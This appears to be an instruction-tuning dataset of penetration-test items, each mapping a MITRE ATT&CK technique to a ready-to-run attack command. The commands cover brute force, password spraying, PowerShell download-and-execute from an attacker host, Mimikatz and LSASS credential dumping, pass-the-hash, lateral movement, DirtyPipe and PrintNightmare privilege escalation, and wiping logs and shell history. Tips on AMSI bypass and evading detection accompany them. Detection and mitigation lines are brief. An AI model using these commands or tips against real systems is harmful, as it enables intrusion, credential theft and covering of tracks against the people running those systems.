instruction: Explain how to execute Brute Force: Password Guessing (T1110.001) during a penetration test.
input:
Scenario: SSH brute force against single target
Target: 10.0.0.5:22 (SSH)
output:
MITRE ATT&CK Analysis: T1110.001 - Brute Force: Password Guessing

[TACTIC]
Credential Access

[DESCRIPTION]
Attempt to guess passwords without knowledge of actual passwords

[SCENARIO]
SSH brute force against single target

[TARGET]
10.0.0.5:22 (SSH)

[TOOL/TECHNIQUE]
hydra

[COMMAND]
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5
```

[OPERATIONAL SECURITY]
- Rate limit to avoid account lockouts
- Use proxychains for IP rotation
- Monitor for defensive response

[DETECTION INDICATORS]
Multiple failed SSH auth attempts, same user different passwords

[RECOMMENDED MITIGATIONS]
Implement account lockout policies, MFA, fail2ban

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Brute Force: Password Guessing (T1110.001) during a penetration test.
input:
Scenario: RDP brute force on Windows target
Target: 10.0.0.10:3389 (RDP)
output:
MITRE ATT&CK Analysis: T1110.001 - Brute Force: Password Guessing

[TACTIC]
Credential Access

[DESCRIPTION]
Attempt to guess passwords without knowledge of actual passwords

[SCENARIO]
RDP brute force on Windows target

[TARGET]
10.0.0.10:3389 (RDP)

[TOOL/TECHNIQUE]
crowbar

[COMMAND]
```
crowbar -b rdp -s 10.0.0.10/32 -u administrator -C passwords.txt
```

[OPERATIONAL SECURITY]
- Windows logs failed logins (Event ID 4625)
- Space attempts over time
- Consider NLA bypass techniques

[DETECTION INDICATORS]
Event ID 4625 with LogonType 10 (RemoteInteractive)

[RECOMMENDED MITIGATIONS]
NLA, MFA, RDP gateway, account lockout

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Brute Force: Password Spraying (T1110.003) during a penetration test.
input:
Scenario: O365 password spray
Target: Office 365 tenant
output:
MITRE ATT&CK Analysis: T1110.003 - Brute Force: Password Spraying

[TACTIC]
Credential Access

[DESCRIPTION]
Use one password against many accounts to avoid lockout

[SCENARIO]
O365 password spray

[TARGET]
Office 365 tenant

[TOOL/TECHNIQUE]
MSOLSpray

[COMMAND]
```
python3 MSOLSpray.py -u users.txt -p 'Summer2023!' -t 10
```

[OPERATIONAL SECURITY]
- Wait 30+ minutes between password attempts
- Use residential proxies
- Validate users first with O365creeper

[DETECTION INDICATORS]
Multiple accounts failing with same password, unified audit logs

[RECOMMENDED MITIGATIONS]
Smart lockout, Azure AD Identity Protection, conditional access

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Brute Force: Password Spraying (T1110.003) during a penetration test.
input:
Scenario: Domain password spray
Target: corp.local domain
output:
MITRE ATT&CK Analysis: T1110.003 - Brute Force: Password Spraying

[TACTIC]
Credential Access

[DESCRIPTION]
Use one password against many accounts to avoid lockout

[SCENARIO]
Domain password spray

[TARGET]
corp.local domain

[TOOL/TECHNIQUE]
Spray

[COMMAND]
```
spray.sh -smb 10.0.0.1 users.txt passwords.txt 1 30 corp.local
```

[OPERATIONAL SECURITY]
- Enumerate lockout policy first
- Stay under lockout threshold
- Target accounts without MFA

[DETECTION INDICATORS]
Event ID 4771 with error 0x18 across multiple accounts

[RECOMMENDED MITIGATIONS]
Fine-grained password policies, MFA for all accounts

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Command and Scripting: PowerShell (T1059.001) during a penetration test.
input:
Scenario: Download and execute payload
Target: Windows workstation
output:
MITRE ATT&CK Analysis: T1059.001 - Command and Scripting: PowerShell

[TACTIC]
Execution

[DESCRIPTION]
Use PowerShell to execute commands and scripts

[SCENARIO]
Download and execute payload

[TARGET]
Windows workstation

[TOOL/TECHNIQUE]
PowerShell

[COMMAND]
```
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

[OPERATIONAL SECURITY]
- Use HTTPS to avoid content inspection
- AMSI bypass: [Ref].Assembly.GetType('...')
- Consider encoded commands

[DETECTION INDICATORS]
Event ID 4104, ScriptBlock logging, AMSI alerts

[RECOMMENDED MITIGATIONS]
Constrained Language Mode, AMSI, application whitelisting

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Command and Scripting: PowerShell (T1059.001) during a penetration test.
input:
Scenario: In-memory Mimikatz
Target: Compromised Windows server
output:
MITRE ATT&CK Analysis: T1059.001 - Command and Scripting: PowerShell

[TACTIC]
Execution

[DESCRIPTION]
Use PowerShell to execute commands and scripts

[SCENARIO]
In-memory Mimikatz

[TARGET]
Compromised Windows server

[TOOL/TECHNIQUE]
Invoke-Mimikatz

[COMMAND]
```
powershell -ep bypass -c "IEX(IWR 'https://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

[OPERATIONAL SECURITY]
- Patch AMSI before loading
- Use obfuscated version (Invoke-Obfuscation)
- Consider .NET assembly loading

[DETECTION INDICATORS]
Suspicious PowerShell keywords, memory patterns

[RECOMMENDED MITIGATIONS]
Credential Guard, LSASS protection, monitored WDigest

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute OS Credential Dumping: LSASS Memory (T1003.001) during a penetration test.
input:
Scenario: Mimikatz sekurlsa
Target: Windows domain workstation
output:
MITRE ATT&CK Analysis: T1003.001 - OS Credential Dumping: LSASS Memory

[TACTIC]
Credential Access

[DESCRIPTION]
Extract credentials from LSASS process memory

[SCENARIO]
Mimikatz sekurlsa

[TARGET]
Windows domain workstation

[TOOL/TECHNIQUE]
Mimikatz

[COMMAND]
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

[OPERATIONAL SECURITY]
- Requires admin/SYSTEM
- EDR will likely detect
- Consider memory dump + offline extraction

[DETECTION INDICATORS]
Sysmon Event ID 10 (process access to lsass), Defender alerts

[RECOMMENDED MITIGATIONS]
Credential Guard, Protected Users group, RunAsPPL

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute OS Credential Dumping: LSASS Memory (T1003.001) during a penetration test.
input:
Scenario: Procdump LSASS
Target: Endpoint with EDR
output:
MITRE ATT&CK Analysis: T1003.001 - OS Credential Dumping: LSASS Memory

[TACTIC]
Credential Access

[DESCRIPTION]
Extract credentials from LSASS process memory

[SCENARIO]
Procdump LSASS

[TARGET]
Endpoint with EDR

[TOOL/TECHNIQUE]
procdump

[COMMAND]
```
procdump.exe -ma lsass.exe lsass.dmp
```

[OPERATIONAL SECURITY]
- Signed Microsoft binary (LOLBin)
- Move dump offline for extraction
- Delete dump after extraction

[DETECTION INDICATORS]
Access to lsass.exe, suspicious file creation

[RECOMMENDED MITIGATIONS]
Application control, protected process light

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Valid Accounts: Domain Accounts (T1078.002) during a penetration test.
input:
Scenario: Pass the Hash
Target: Windows server with extracted NTLM hash
output:
MITRE ATT&CK Analysis: T1078.002 - Valid Accounts: Domain Accounts

[TACTIC]
Persistence

[DESCRIPTION]
Use compromised domain credentials for access

[SCENARIO]
Pass the Hash

[TARGET]
Windows server with extracted NTLM hash

[TOOL/TECHNIQUE]
Impacket psexec

[COMMAND]
```
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.5
```

[OPERATIONAL SECURITY]
- Creates service on target
- Event ID 7045 (service install)
- Consider wmiexec for stealth

[DETECTION INDICATORS]
Event ID 4624 type 3, service creation, network logon

[RECOMMENDED MITIGATIONS]
Credential Guard, SMB signing, limit admin rights

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Valid Accounts: Domain Accounts (T1078.002) during a penetration test.
input:
Scenario: Over-pass the Hash
Target: Kerberos environment
output:
MITRE ATT&CK Analysis: T1078.002 - Valid Accounts: Domain Accounts

[TACTIC]
Persistence

[DESCRIPTION]
Use compromised domain credentials for access

[SCENARIO]
Over-pass the Hash

[TARGET]
Kerberos environment

[TOOL/TECHNIQUE]
Rubeus

[COMMAND]
```
Rubeus.exe asktgt /user:admin /rc4:8846f7... /ptt
```

[OPERATIONAL SECURITY]
- Injects Kerberos ticket into session
- More stealthy than NTLM
- Refresh tickets as needed

[DETECTION INDICATORS]
Event ID 4768 with RC4 encryption (downgrade)

[RECOMMENDED MITIGATIONS]
Enforce AES, monitor for RC4 TGT requests

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Remote Services: SMB/Windows Admin Shares (T1021.002) during a penetration test.
input:
Scenario: PsExec lateral movement
Target: Windows server 10.0.0.20
output:
MITRE ATT&CK Analysis: T1021.002 - Remote Services: SMB/Windows Admin Shares

[TACTIC]
Lateral Movement

[DESCRIPTION]
Use SMB for lateral movement to remote systems

[SCENARIO]
PsExec lateral movement

[TARGET]
Windows server 10.0.0.20

[TOOL/TECHNIQUE]
PsExec

[COMMAND]
```
psexec \\10.0.0.20 -u domain\admin -p password cmd
```

[OPERATIONAL SECURITY]
- Leaves service binary on target
- High IOC in logs
- Consider alternative execution methods

[DETECTION INDICATORS]
Event ID 7045, PSEXESVC service, network share access

[RECOMMENDED MITIGATIONS]
Disable admin shares, firewall SMB, monitor service creation

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Remote Services: SMB/Windows Admin Shares (T1021.002) during a penetration test.
input:
Scenario: WMI lateral movement
Target: Windows endpoint
output:
MITRE ATT&CK Analysis: T1021.002 - Remote Services: SMB/Windows Admin Shares

[TACTIC]
Lateral Movement

[DESCRIPTION]
Use SMB for lateral movement to remote systems

[SCENARIO]
WMI lateral movement

[TARGET]
Windows endpoint

[TOOL/TECHNIQUE]
wmiexec

[COMMAND]
```
wmiexec.py domain/admin:password@10.0.0.20 'whoami'
```

[OPERATIONAL SECURITY]
- No file writes (more stealthy)
- Uses WMI for execution
- Output returned via SMB

[DETECTION INDICATORS]
Event ID 4648, WMI process creation (Event ID 1)

[RECOMMENDED MITIGATIONS]
Disable remote WMI, monitor WmiPrvSE child processes

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Exploitation for Privilege Escalation (T1068) during a penetration test.
input:
Scenario: Linux kernel exploit
Target: Ubuntu 18.04 with vulnerable kernel
output:
MITRE ATT&CK Analysis: T1068 - Exploitation for Privilege Escalation

[TACTIC]
Privilege Escalation

[DESCRIPTION]
Exploit software vulnerabilities to gain elevated privileges

[SCENARIO]
Linux kernel exploit

[TARGET]
Ubuntu 18.04 with vulnerable kernel

[TOOL/TECHNIQUE]
DirtyPipe (CVE-2022-0847)

[COMMAND]
```
./dirtypipe /etc/passwd 1 "attacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash\n"
```

[OPERATIONAL SECURITY]
- May crash system if unsuccessful
- Test on equivalent system first
- Have backup access method

[DETECTION INDICATORS]
Unusual writes to read-only files, kernel logs

[RECOMMENDED MITIGATIONS]
Patch kernel, container security, mandatory access control

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Exploitation for Privilege Escalation (T1068) during a penetration test.
input:
Scenario: Windows Print Spooler (PrintNightmare)
Target: Windows Server with spooler enabled
output:
MITRE ATT&CK Analysis: T1068 - Exploitation for Privilege Escalation

[TACTIC]
Privilege Escalation

[DESCRIPTION]
Exploit software vulnerabilities to gain elevated privileges

[SCENARIO]
Windows Print Spooler (PrintNightmare)

[TARGET]
Windows Server with spooler enabled

[TOOL/TECHNIQUE]
CVE-2021-34527 exploit

[COMMAND]
```
python3 printnightmare.py domain/user:pass@10.0.0.5 '\\attacker\share\evil.dll'
```

[OPERATIONAL SECURITY]
- Requires SMB share accessible from target
- Noisy - creates DLL on target
- Spooler often enabled unnecessarily

[DETECTION INDICATORS]
Unusual spoolsv.exe activity, DLL load events

[RECOMMENDED MITIGATIONS]
Disable Print Spooler, patch, Point and Print restrictions

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Data Encrypted for Impact (T1486) during a penetration test.
input:
Scenario: Ransomware simulation - file encryption test
Target: Test network share with sample data
output:
MITRE ATT&CK Analysis: T1486 - Data Encrypted for Impact

[TACTIC]
Impact

[DESCRIPTION]
Encrypt data on target systems (ransomware impact simulation)

[SCENARIO]
Ransomware simulation - file encryption test

[TARGET]
Test network share with sample data

[TOOL/TECHNIQUE]
Custom script (controlled)

[COMMAND]
```
# AUTHORIZED TESTING ONLY
python3 encrypt_test.py --directory /test/data --key test123 --rename .encrypted
```

[OPERATIONAL SECURITY]
- ONLY use in authorized simulations
- Keep decryption key secure
- Document all encrypted files

[DETECTION INDICATORS]
Mass file modifications, unusual file extensions

[RECOMMENDED MITIGATIONS]
Backup strategy, behavioral detection, network segmentation

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Indicator Removal: File Deletion (T1070.004) during a penetration test.
input:
Scenario: Clean up exploitation artifacts
Target: Compromised Windows server
output:
MITRE ATT&CK Analysis: T1070.004 - Indicator Removal: File Deletion

[TACTIC]
Defense Evasion

[DESCRIPTION]
Delete files left behind after exploitation

[SCENARIO]
Clean up exploitation artifacts

[TARGET]
Compromised Windows server

[TOOL/TECHNIQUE]
SDelete

[COMMAND]
```
sdelete -p 3 C:\Temp\payload.exe
```

[OPERATIONAL SECURITY]
- Use secure delete to prevent recovery
- Check for backup copies
- Clear relevant event logs

[DETECTION INDICATORS]
MFT analysis, volume shadow copies, forensic recovery

[RECOMMENDED MITIGATIONS]
Forensic imaging, shadow copy protection, file integrity monitoring

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Indicator Removal: File Deletion (T1070.004) during a penetration test.
input:
Scenario: Linux artifact cleanup
Target: Compromised Linux server
output:
MITRE ATT&CK Analysis: T1070.004 - Indicator Removal: File Deletion

[TACTIC]
Defense Evasion

[DESCRIPTION]
Delete files left behind after exploitation

[SCENARIO]
Linux artifact cleanup

[TARGET]
Compromised Linux server

[TOOL/TECHNIQUE]
shred

[COMMAND]
```
shred -u -z -n 3 /tmp/implant && history -c && > ~/.bash_history
```

[OPERATIONAL SECURITY]
- Overwrite file before deletion
- Clear shell history
- Check for command logging (auditd)

[DETECTION INDICATORS]
Auditd logs, file access timestamps, command history gaps

[RECOMMENDED MITIGATIONS]
Centralized logging, immutable logs, file integrity monitoring

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Network Service Discovery (T1046) during a penetration test.
input:
Scenario: Service version detection
Target: Internal network 10.0.0.0/24
output:
MITRE ATT&CK Analysis: T1046 - Network Service Discovery

[TACTIC]
Discovery

[DESCRIPTION]
Scan for services running on remote systems

[SCENARIO]
Service version detection

[TARGET]
Internal network 10.0.0.0/24

[TOOL/TECHNIQUE]
nmap

[COMMAND]
```
nmap -sV -sC --top-ports 1000 -oA scan_results 10.0.0.0/24
```

[OPERATIONAL SECURITY]
- Avoid -T5 (too aggressive)
- Split scans over time
- Use -sS for stealth if possible

[DETECTION INDICATORS]
IDS signatures, connection logs, firewall alerts

[RECOMMENDED MITIGATIONS]
Network segmentation, IDS/IPS, baseline traffic analysis

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response

instruction: Explain how to execute Network Service Discovery (T1046) during a penetration test.
input:
Scenario: Living off the land discovery
Target: Windows domain
output:
MITRE ATT&CK Analysis: T1046 - Network Service Discovery

[TACTIC]
Discovery

[DESCRIPTION]
Scan for services running on remote systems

[SCENARIO]
Living off the land discovery

[TARGET]
Windows domain

[TOOL/TECHNIQUE]
Native commands

[COMMAND]
```
for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.0.%i > nul && echo 10.0.0.%i is up
```

[OPERATIONAL SECURITY]
- Uses native tools (no additional binaries)
- Slower but stealthier
- Combine with net commands

[DETECTION INDICATORS]
Unusual volume of ICMP, net command execution

[RECOMMENDED MITIGATIONS]
Baseline normal behavior, monitor for discovery patterns

[ADDITIONAL CONSIDERATIONS]
- Document all actions for report
- Verify scope authorization before execution
- Have rollback plan ready
- Monitor for defensive response
